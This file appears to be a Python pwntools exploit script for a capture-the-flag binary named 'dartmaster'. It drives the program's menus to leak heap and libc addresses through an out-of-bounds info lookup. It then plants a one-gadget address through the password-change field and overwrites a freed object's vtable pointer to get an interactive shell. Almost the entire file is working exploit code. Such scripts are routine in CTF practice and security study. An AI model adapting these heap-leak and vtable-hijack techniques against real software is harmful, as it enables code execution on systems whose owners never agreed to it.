from pwn import *

r = process("./dartmaster")

script = '''
tracemalloc on
c
'''
#gdb.attach(r, script)

def login(ID, pw):
	r.sendline("1")
	print r.recvuntil("ID : ")
	r.sendline(ID)
	print r.recvuntil("password : ")
	r.sendline(pw)
	print r.recvuntil("> ")

def createID(ID, pw, info):
	print r.recvuntil("ID : ")
	r.sendline(ID)
	print r.recvuntil("password : ")
	r.sendline(pw)
	print r.recvuntil("password : ")
	r.sendline(pw)
	print r.recvuntil("information : ")
	r.sendline(info)
	print r.recvuntil("> ")

def genID(ID, pw, info):
	r.sendline("2")
	createID(ID, pw, info)

def delID(ID, pw):
	r.sendline("3")
	print r.recvuntil("delete? ")
	r.sendline(ID)
	print r.recvuntil("password : ")
	r.sendline(pw)
	print r.recvuntil("> ")

def seeInfo(idx, what):
	r.sendline("3")
	print r.recvuntil("> ")
	r.sendline("3")
	print r.recvuntil("see?")
	r.sendline(str(idx))
	print r.recvuntil("> ")
	r.sendline(str(what)) # cardID 1 ID 2 Info 3 Numvic 4
	rv = r.recvuntil("> ")
	print rv
	r.sendline("5")
	print r.recvuntil("> ")
	return rv

def changePW(pw):
	r.sendline("3")
	print r.recvuntil("> ")
	r.sendline("1")
	print r.recvuntil("password : ")
	r.sendline(pw)
	print r.recvuntil("> ")
	r.sendline("5")
	print r.recvuntil("> ")

def practice():
	r.sendline("1")
	for i in range(30):
		r.sendline("50")
	print r.recvuntil("> ")

def win():
	r.sendline("2")
	for i in range(9):
		r.sendline("50")
	r.sendline("1")
	r.sendline("50")
	print r.recvuntil("> ")

createID("mathboy7", "asdf", "asdf")
genID("A"*10, "B"*10, "C"*10)
genID("a"*10, "b"*10, "c"*10)
genID("d"*10, "e"*10, "f"*10)

delID("A"*10, "B"*10)
delID("a"*10, "b"*10)

login("mathboy7", "asdf")

heap = seeInfo(1, 1)
heap = heap[heap.index("0x")+2:]
heap = int(heap[:12], 16)

libc = seeInfo(587, 1)
libc = libc[libc.index("0x")+2:]
libc = int(libc[:12], 16)

vtbl = heap - 0x1310
libc_base = libc - 0x3c1b88
system = libc_base + 0x456a0
gets = libc_base + 0x6fff0

payload = "B"*0x10
payload += p64(libc_base + 0xf1651) # one shot, [rsp+0x40] == NULL
payload += "B"*0x28

changePW(payload)

print "heap: " + hex(heap)
print "libc: " + hex(libc)

practice()
win()

r.sendline("3")
print r.recvuntil("> ")
r.sendline("4")
print r.recvuntil("> ")

r.sendline("3")
print r.recvuntil("delete?")
r.sendline("mathboy7")
print r.recvuntil("password : ")
r.sendline(p64(vtbl) + "\x00"*48)

r.sendline("2")

r.interactive()
